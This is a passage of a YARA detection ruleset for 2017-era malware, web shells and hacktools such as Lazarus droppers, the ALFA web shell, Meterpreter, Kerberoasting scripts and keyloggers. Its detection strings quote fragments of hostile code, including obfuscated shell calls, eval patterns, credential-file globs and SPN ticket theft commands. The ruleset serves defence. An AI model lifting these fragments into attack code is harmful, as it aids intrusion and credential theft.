      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "180b920e9cea712d124ff41cd1060683a14a79285d960e17f0f49b969f15bfcc"
      tags = "DEMO, G0010, MAL, RUSSIA, SCRIPT, T1059"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = ".charCodeAt(i % " ascii
      $s2 = "{WScript.Quit();}" fullword ascii
      $s3 = ".charAt(i)) << 10) |" ascii
      $s4 = " = WScript.Arguments;var " ascii
      $s5 = "= \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";var i;" ascii
   condition: 
      filesize < 200KB and 2 of them
}

rule VBS_dropper_script_Dec17_1_RID30AE : DEMO SCRIPT T1059 {
   meta:
      description = "Detects a supicious VBS script that drops an executable"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-01-01 12:50:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1059"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "TVpTAQEAAAAEAA" 
      $s2 = "TVoAAAAAAAAAAA" 
      $s3 = "TVqAAAEAAAAEAB" 
      $s4 = "TVpQAAIAAAAEAA" 
      $s5 = "TVqQAAMAAAAEAA" 
      $a1 = "= CreateObject(\"Wscript.Shell\")" fullword ascii
   condition: 
      filesize < 600KB and $a1 and 1 of ( $s* )
}

rule Armitage_msfconsole_RID2ED3 : DEMO HKTL {
   meta:
      description = "Detects Armitage component"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-12-24 11:31:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2022-08-18"
      hash1 = "662ba75c7ed5ac55a898f480ed2555d47d127a2d96424324b02724b3b2c95b6a"
      tags = "DEMO, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "\\umeterpreter\\u >" ascii
      $s3 = "^meterpreter >" fullword ascii
      $s11 = "\\umsf\\u>" ascii
   condition: 
      filesize < 1KB and 2 of them
}

rule Armitage_MeterpreterSession_Strings_RID3556 : DEMO HKTL {
   meta:
      description = "Detects Armitage component"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-12-24 16:08:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2020-05-19"
      hash1 = "b258b2f12f57ed05d8eafd29e9ecc126ae301ead9944a616b87c240bf1e71f9a"
      hash2 = "144cb6b1cf52e60f16b45ddf1633132c75de393c2705773b9f67fce334a3c8b8"
      tags = "DEMO, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "session.meterpreter_read" fullword ascii
      $s2 = "sniffer_dump" fullword ascii
      $s3 = "keyscan_dump" fullword ascii
      $s4 = "MeterpreterSession.java" fullword ascii
   condition: 
      filesize < 30KB and 1 of them
}

rule Lazarus_Dec_17_1_RID2CB5 : APT DEMO FILE G0032 NK T1218_001 {
   meta:
      description = "Detects Lazarus malware from incident in Dec 2017"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/threat-insight/post/north-korea-bitten-bitcoin-bug-financially-motivated-campaigns-reveal-new"
      date = "2017-12-20 10:00:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "d5f9a81df5061c69be9c0ed55fba7d796e1a8ebab7c609ae437c574bd7b30b48"
      tags = "APT, DEMO, FILE, G0032, NK, T1218_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "::DataSpace/Storage/MSCompressed/Transform/" ascii
      $s2 = "HHA Version 4." ascii
      $s3 = { 74 45 58 74 53 6F 66 74 77 61 72 65 00 41 64 6F 62 65 20 49 6D 61 67 65 52 65 61 64 79 71 } 
      $s4 = "bUEeYE" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5449 and filesize < 4000KB and all of them
}

rule Lazarus_Dec_17_4_RID2CB8 : APT DEMO G0032 NK {
   meta:
      description = "Detects Lazarus malware from incident in Dec 2017ithumb.js"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/threat-insight/post/north-korea-bitten-bitcoin-bug-financially-motivated-campaigns-reveal-new"
      date = "2017-12-20 10:01:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "8ff100ca86cb62117f1290e71d5f9c0519661d6c955d9fcfb71f0bbdf75b51b3"
      hash2 = "7975c09dd436fededd38acee9769ad367bfe07c769770bd152f33a10ed36529e"
      tags = "APT, DEMO, G0032, NK"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "var _0xf5ed=[\"\\x57\\x53\\x63\\x72\\x69\\x70\\x74\\x2E\\x53\\x68\\x65\\x6C\\x6C\"," ascii
   condition: 
      filesize < 9KB and 1 of them
}

rule UBootRAT_Dropper_RID2D1C : APT DEMO EXE FILE {
   meta:
      description = "Detects UBootRAT Dropper"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/"
      date = "2017-11-29 10:17:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f4c659238ffab95e87894d2c556f887774dce2431e8cb87f881df4e4d26253a3"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "GetCurrenvackageId" fullword ascii
      $s2 = "fghijklmnopq" fullword ascii
      $s3 = "23456789:;<=>?@ABCDEFGHIJKLMNOPQ" fullword ascii
      $s4 = "PMM/dd/y" fullword ascii
      $s5 = "bad all" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
}

rule Webshell_FOPO_Obfuscation_APT_ON_Nov17_1_RID3580 : APT DEMO FILE NK OBFUS T1505_003 WEBSHELL {
   meta:
      description = "Detects malware from NK APT incident DE"
      author = "Florian Roth"
      reference = "Internal Research - ON"
      date = "2017-11-17 16:15:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2020-07-31"
      hash1 = "ed6e2e0027d3f564f5ce438984dc8a54577df822ce56ce079c60c99a91d5ffb1"
      tags = "APT, DEMO, FILE, NK, OBFUS, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Obfuscation provided by FOPO" fullword ascii
      $s1 = "\";@eval($" ascii
      $f1 = { 22 29 29 3B 0D 0A 3F 3E } 
   condition: 
      uint16 ( 0 ) == 0x3f3c and filesize < 800KB and ( $x1 or ( $s1 in ( 0 .. 350 ) and $f1 at ( filesize - 23 ) ) )
}

rule SunOrcal_Malware_Nov17_1_RID2FEA : DEMO EXE FILE MAL {
   meta:
      description = "Detects Reaver malware mentioned in PaloAltoNetworks report"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/"
      date = "2017-11-11 12:17:31"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "cb7c0cf1750baaa11783e93369230ee666b9f3da7298e4d1bb9a07af6a439f2f"
      hash2 = "799139b5278dc2ac24279cc6c3db44f4ef0ea78ee7b721b0ace38fd8018c51ac"
      hash3 = "38ea33dab0ba2edd16ecd98cba161c550d1036b253c8666c4110d198948329fb"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "kQZ6l5t1kAlsjmBzsCZPrSpQn5tFrChLtTdsgTlOsClKt5pBsDdFrSVshnxMr6ZOpn9slndBsy1jq6lIr216rSNApn9P" fullword ascii
      $x2 = { 00 00 00 00 00 00 00 00 00 00 00 00 21 21 21 73 79 73 74 65 6D 00 00 00 00 00 00 00 00 00 00 00 } 
      $x3 = "!!!url!!!" fullword ascii
      $x4 = "h4NcbkdLrCpFpPQ=" fullword ascii
      $x5 = "GloablCryptNv1" fullword ascii
      $x6 = "Gloabl\\CryptNv1" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them
}

rule BadRabbit_Mimikatz_Comp_RID2FFF : DEMO EXE FILE MAL S0002 T1003 T1134_005 T1550_002 T1550_003 {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "https://pastebin.com/Y7pJv3tK"
      date = "2017-10-25 12:21:01"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2f8c54f9fa8e47596a3beff0031f85360e56840c77f71c6a573ace6f46412035"
      tags = "DEMO, EXE, FILE, MAL, S0002, T1003, T1134_005, T1550_002, T1550_003"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "%lS%lS%lS:%lS" fullword wide
      $s2 = "lsasrv" fullword wide
      $s3 = "CredentialKeys" ascii
      $s4 = { 50 72 69 6D 61 72 79 00 6D 00 73 00 76 00 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them )
}

rule TA17_293A_Hacktool_PS_1_RID2E72 : APT DEMO SCRIPT T1059_001 {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/alerts/TA17-293A"
      date = "2017-10-21 11:14:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "72a28efb6e32e653b656ca32ccd44b3111145a695f6f6161965deebbdc437076"
      tags = "APT, DEMO, SCRIPT, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "$HashFormat = '$krb5tgs$23$*ID#124_DISTINGUISHED NAME: CN=fakesvc,OU=Service,OU=Accounts,OU=EnterpriseObjects,DC=asdf,DC=pd,DC=f" ascii
      $x2 = "} | Where-Object {$_.SamAccountName -notmatch 'krbtgt'} | Get-SPNTicket @GetSPNTicketArguments" fullword ascii
   condition: 
      ( filesize < 80KB and 1 of them )
}

rule TA17_293A_Hacktool_Touch_MAC_modification_RID35C7 : APT DEMO EXE FILE {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/alerts/TA17-293A"
      date = "2017-10-21 16:27:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "070d7082a5abe1112615877214ec82241fd17e5bd465e24d794a470f699af88e"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "-t time - use the time specified to update the access and modification times" fullword ascii
      $s2 = "Failed to set file times for %s. Error: %x" fullword ascii
      $s3 = "touch [-acm][ -r ref_file | -t time] file..." fullword ascii
      $s4 = "-m - change the modification time only" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule BronzeButler_DGet_1_RID2E42 : APT CHINA DEMO EXE FILE G0060 {
   meta:
      description = "Detects malware / hacktool sample from Bronze Butler incident"
      author = "Florian Roth"
      reference = "https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses"
      date = "2017-10-14 11:06:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "bd81521445639aaa5e3bcb5ece94f73feda3a91880a34a01f92639f8640251d6"
      tags = "APT, CHINA, DEMO, EXE, FILE, G0060"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "DGet Tool Made by XZ" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 10KB and 1 of them )
}

rule Saudi_Phish_Trojan_RID2E2F : DEMO EXE FILE MAL T1203 T1566_001 {
   meta:
      description = "Detects a trojan used in Saudi Aramco Phishing"
      author = "Florian Roth"
      reference = "https://www.virustotal.com/gui/file/8ad94dc5d59aa1e9962c76fd5ca042e582566049a97aef9f5730ba779e5ebb91/detection"
      date = "2017-10-12 11:03:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "8ad94dc5d59aa1e9962c76fd5ca042e582566049a97aef9f5730ba779e5ebb91"
      tags = "DEMO, EXE, FILE, MAL, T1203, T1566_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = { 7B 00 30 00 7D 00 7B 00 31 00 7D 00 5C 00 00 09 2E 00 64 00 6C 00 6C 00 00 11 77 00 33 00 77 00 70 00 2E 00 65 00 78 00 65 00 00 1B 61 00 73 00 70 00 6E 00 65 00 74 00 5F 00 77 00 70 00 2E 00 65 00 78 00 65 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them )
}

rule redSails_PY_RID2B50 : DEMO HKTL SCRIPT T1059_006 {
   meta:
      description = "Detects Red Sails Hacktool - Python"
      author = "Florian Roth"
      reference = "https://github.com/BeetleChunks/redsails"
      date = "2017-10-02 09:01:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "6ebedff41992b9536fe9b1b704a29c8c1d1550b00e14055e3c6376f75e462661"
      hash2 = "5ec20cb99030f48ba512cbc7998b943bebe49396b20cf578c26debbf14176e5e"
      tags = "DEMO, HKTL, SCRIPT, T1059_006"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Gained command shell on host" fullword ascii
      $x2 = "[!] Received an ERROR in shell()" fullword ascii
      $x3 = "Target IP address with backdoor installed" fullword ascii
      $x4 = "Open backdoor port on target machine" fullword ascii
      $x5 = "Backdoor port to open on victim machine" fullword ascii
   condition: 
      1 of them
}

rule Xtreme_Sep17_3_RID2C07 : DEMO EXE FILE MAL {
   meta:
      description = "Detects XTREME sample analyzed in September 2017"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-09-27 09:31:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f540a4cac716438da0c1c7b31661abf35136ea69b963e8f16846b96f8fd63dde"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "Keylogg" fullword ascii
      $s4 = "XTREME" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and all of them )
}

rule Microcin_Sample_2_RID2D97 : DEMO EXE FILE MAL {
   meta:
      description = "Malware sample mentioned in Microcin technical report by Kaspersky"
      author = "Florian Roth"
      reference = "https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf"
      date = "2017-09-26 10:38:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "8a7d04229722539f2480270851184d75b26c375a77b468d8cbad6dbdb0c99271"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "[Pause]" fullword ascii
      $s7 = "IconCache_%02d%02d%02d%02d%02d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
}

rule Microcin_Sample_3_RID2D98 : DEMO EXE FILE MAL {
   meta:
      description = "Malware sample mentioned in Microcin technical report by Kaspersky"
      author = "Florian Roth"
      reference = "https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf"
      date = "2017-09-26 10:38:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4f74a3b67c5ed6f38f08786f1601214412249fe128f12c51525135710d681e1d"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "C:\\Users\\Lenovo\\Desktop\\test\\Release\\test.pdb" fullword ascii
      $s2 = "test, Version 1.0" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
}

rule Microcin_Sample_4_RID2D99 : DEMO EXE FILE MAL {
   meta:
      description = "Malware sample mentioned in Microcin technical report by Kaspersky"
      author = "Florian Roth"
      reference = "https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf"
      date = "2017-09-26 10:38:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "92c01d5af922bdaacb6b0b2dfbe29e5cc58c45cbee5133932a499561dab616b8"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "cmd /c dir /a /s \"%s\" > \"%s\"" fullword wide
      $s2 = "ini.dat" fullword wide
      $s3 = "winupdata" fullword wide
      $f1 = "%s\\(%08x%08x)%s" fullword wide
      $f2 = "%s\\d%08x\\d%08x.db" fullword wide
      $f3 = "%s\\u%08x\\u%08x.db" fullword wide
      $f4 = "%s\\h%08x\\h%08x.db" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of ( $s* ) or 5 of them )
}

rule Microcin_Sample_5_RID2D9A : DEMO EXE MAL {
   meta:
      description = "Malware sample mentioned in Microcin technical report by Kaspersky"
      author = "Florian Roth"
      reference = "https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf"
      date = "2017-09-26 10:38:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "b9c51397e79d5a5fd37647bc4e4ee63018ac3ab9d050b02190403eb717b1366e"
      tags = "DEMO, EXE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Sorry, you are not fortuante ^_^, Please try other password dictionary " fullword ascii
      $x2 = "DomCrack <IP> <UserName> <Password_Dic file path> <option>" fullword ascii
      $x3 = "The password is \"%s\"         Time: %d(s)" fullword ascii
      $x4 = "The password is \" %s \"         Time: %d(s)" fullword ascii
      $x5 = "No password found!" fullword ascii
      $x7 = "Can not found the Password Dictoonary file! " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them ) or 2 of them
}

rule Microcin_Sample_6_RID2D9B : DEMO EXE FILE MAL {
   meta:
      description = "Malware sample mentioned in Microcin technical report by Kaspersky"
      author = "Florian Roth"
      reference = "https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf"
      date = "2017-09-26 10:39:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "cbd43e70dc55e94140099722d7b91b07a3997722d4a539ecc4015f37ea14a26e"
      hash2 = "871ab24fd6ae15783dd9df5010d794b6121c4316b11f30a55f23ba37eef4b87a"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "** ERROR ** %s: %s" fullword ascii
      $s2 = "TEMPDATA" fullword wide
      $s3 = "Bruntime error " fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them )
}

rule ALFA_SHELL_RID29FC : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects web shell often used by Iranian APT groups"
      author = "Florian Roth"
      reference = "http://getalfa.rf.gd/?i=1"
      date = "2017-09-21 02:45:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a39d8823d54c55e60a7395772e50d116408804c1a5368391a1e5871dbdc83547"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64')" ascii
      $x2 = "#solevisible@gmail.com" fullword ascii
      $x3 = "'login_page' => '500',//gui or 500 or 403 or 404" fullword ascii
      $x4 = "$GLOBALS['__ALFA__']" fullword ascii
      $x5 = "if(!function_exists('b'.'as'.'e6'.'4_'.'en'.'co'.'de')" ascii
      $f1 = { 76 2F 38 76 2F 36 76 2F 2B 76 2F 2F 66 38 46 27 29 3B 3F 3E 0D 0A } 
   condition: 
      ( filesize < 900KB and 2 of ( $x* ) or $f1 at ( filesize - 22 ) )
}

rule DragonFly_APT_Sep17_1_RID2E5A : APT DEMO EXE FILE G0035 MAL {
   meta:
      description = "Detects malware from DrqgonFly APT report"
      author = "Florian Roth"
      reference = "https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group"
      date = "2017-09-12 11:10:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "fc54d8afd2ce5cb6cc53c46783bf91d0dd19de604308d536827320826bc36ed9"
      tags = "APT, DEMO, EXE, FILE, G0035, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "\\Update\\Temp\\ufiles.txt" wide
      $s2 = "%02d.%02d.%04d %02d:%02d" fullword wide
      $s3 = "*pass*.*" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )
}

rule Rehashed_RAT_3_RID2C0D : DEMO EXE FILE MAL {
   meta:
      description = "Detects malware from Rehashed RAT incident"
      author = "Florian Roth"
      reference = "https://blog.fortinet.com/2017/09/05/rehashed-rat-used-in-apt-campaign-against-vietnamese-organizations"
      date = "2017-09-08 09:32:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2022-12-21"
      hash1 = "9cebae97a067cd7c2be50d7fd8afe5e9cf935c11914a1ab5ff59e91c1e7e5fc4"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "\\BisonNewHNStubDll\\Release\\Goopdate.pdb" ascii
      $s2 = "psisrndrx.ebd" fullword wide
      $s3 = "pbad exception" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 2 of them )
}

rule KeeTheft_Out_Shellcode_RID2FAA : DEMO HKTL SCRIPT T1059_001 {
   meta:
      description = "Detects component of KeeTheft - KeePass dump tool - file Out-Shellcode.ps1"
      author = "Florian Roth"
      reference = "https://github.com/HarmJ0y/KeeThief"
      date = "2017-08-29 12:06:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2afb1c8c82363a0ae43cad9d448dd20bb7d2762aa5ed3672cd8e14dee568e16b"
      tags = "DEMO, HKTL, SCRIPT, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Write-Host \"Shellcode length: 0x$(($ShellcodeLength + 1).ToString('X4'))\"" fullword ascii
      $x2 = "$TextSectionInfo = @($MapContents | Where-Object { $_ -match '\\.text\\W+CODE' })[0]" fullword ascii
   condition: 
      ( filesize < 2KB and 1 of them )
}

rule DLL_Injector_Lynx_RID2D94 : DEMO EXE FILE HKTL LynxRansomware {
   meta:
      description = "Detects Lynx DLL Injector"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-08-20 10:37:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d594f60e766e0c3261a599b385e3f686b159a992d19fa624fad8761776efa4f0"
      tags = "DEMO, EXE, FILE, HKTL, LynxRansomware"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = " -p <TARGET PROCESS NAME> | -u <DLL PAYLOAD> [--obfuscate]" fullword wide
      $x2 = "You've selected to inject into process: %s" fullword wide
      $x3 = "Lynx DLL Injector" fullword wide
      $x4 = "Reflective DLL Injector" fullword wide
      $x5 = "Failed write payload: %lu" fullword wide
      $x6 = "Failed to start payload: %lu" fullword wide
      $x7 = "Injecting payload..." fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 800KB and 1 of them ) or ( 3 of them )
}

rule Reflective_DLL_Loader_Aug17_4_RID3182 : DEMO EXE FILE HKTL T1055_001 {
   meta:
      description = "Detects Reflective DLL Loader"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-08-20 13:25:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "205b881701d3026d7e296570533e5380e7aaccaa343d71b6fcc60802528bdb74"
      hash2 = "f76151646a0b94024761812cde1097ae2c6d455c28356a3db1f7905d3d9d6718"
      tags = "DEMO, EXE, FILE, HKTL, T1055_001"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "<H1>&nbsp;>> >> >> Keylogger Installed - %s %s << << <<</H1>" fullword ascii
      $s1 = "<H3> ----- Running Process ----- </H3>" fullword ascii
      $s2 = "<H2>Operating system: %s<H2>" fullword ascii
      $s3 = "<H2>System32 dir:  %s</H2>" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them )
}

rule Unknown_Malware_Sample_Jul17_2_RID326D : DEMO EXE FILE MAL {
   meta:
      description = "Detects unknown malware sample with pastebin RAW URL"
      author = "Florian Roth"
      reference = "https://www.virustotal.com/gui/file/3530d480db082af1823a7eb236203aca24dc3685f08c301466909f0794508a52/detection"
      date = "2017-08-01 14:04:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "3530d480db082af1823a7eb236203aca24dc3685f08c301466909f0794508a52"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii
      $s2 = "https://pastebin.com/raw/" wide
      $s3 = "My.Computer" fullword ascii
      $s4 = "MyTemplate" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
}

rule Foudre_Backdoor_1_RID2D8A : DEMO EXE FILE MAL {
   meta:
      description = "Detects Foudre Backdoor"
      author = "Florian Roth"
      reference = "https://www.paloaltonetworks.com/blog/2017/08/unit42-prince-persia-ride-lightning-infy-returns-foudre/"
      date = "2017-08-01 10:36:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "7e73a727dc8f3c48e58468c3fd0a193a027d085f25fa274a6e187cf503f01f74"
      hash2 = "7ce2c5111e3560aa6036f98b48ceafe83aa1ac3d3b33392835316c859970f8bc"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "initialization failed: Reinstall the program" fullword wide
      $s2 = "SnailDriver V1" fullword wide
      $s3 = "lp.ini" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them )
}

rule WiltedTulip_Zpp_RID2D21 : APT DEMO EXE FILE {
   meta:
      description = "Detects hack tool used in Operation Wilted Tulip"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23 10:18:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2022-12-21"
      hash1 = "10ec585dc1304436821a11e35473c0710e844ba18727b302c6bd7f8ebac574bb"
      hash2 = "7d046a3ed15035ea197235980a72d133863c372cc27545af652e1b2389c23918"
      hash3 = "6d6816e0b9c24e904bc7c5fea5951d53465c478cc159ab900d975baf8a0921cf"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[ERROR] Error Main -i -s -d -gt -lt -mb" fullword wide
      $x2 = "[ERROR] Error Main -i(with.) -s -d -gt -lt -mb -o -e" fullword wide
      $s1 = "LT Time invalid" fullword wide
      $s2 = "doCompressInNetWorkDirectory" fullword ascii
      $s3 = "files remaining ,total file save = " fullword wide
      $s4 = "$ec996350-79a4-477b-87ae-2d5b9dbe20fd" fullword ascii
      $s5 = "Destinition Directory Not Found" fullword wide
      $s6 = "\\obj\\Release\\ZPP.pdb" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and ( 1 of ( $x* ) or 3 of them )
}

rule WiltedTulip_Matryoshka_RAT_RID3150 : APT DEMO EXE FILE {
   meta:
      description = "Detects Matryoshka RAT used in Operation Wilted Tulip"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23 13:17:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "6f208473df0d31987a4999eeea04d24b069fdb6a8245150aa91dfdc063cd64ab"
      hash2 = "6cc1f4ecd28b833c978c8e21a20a002459b4a6c21a4fbaad637111aa9d5b1a32"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "%S:\\Users\\public" fullword wide
      $s2 = "ntuser.dat.swp" fullword wide
      $s3 = "Job Save / Load Config" fullword wide
      $s4 = ".?AVPSCL_CLASS_JOB_SAVE_CONFIG@@" fullword ascii
      $s5 = "winupdate64.com" fullword ascii
      $s6 = "Job Save KeyLogger" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 3 of them )
}

rule Kekeo_Hacktool_RID2C94 : DEMO EXE FILE HKTL {
   meta:
      description = "Detects Kekeo Hacktool"
      author = "Florian Roth"
      reference = "https://github.com/gentilkiwi/kekeo/releases"
      date = "2017-07-21 09:55:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
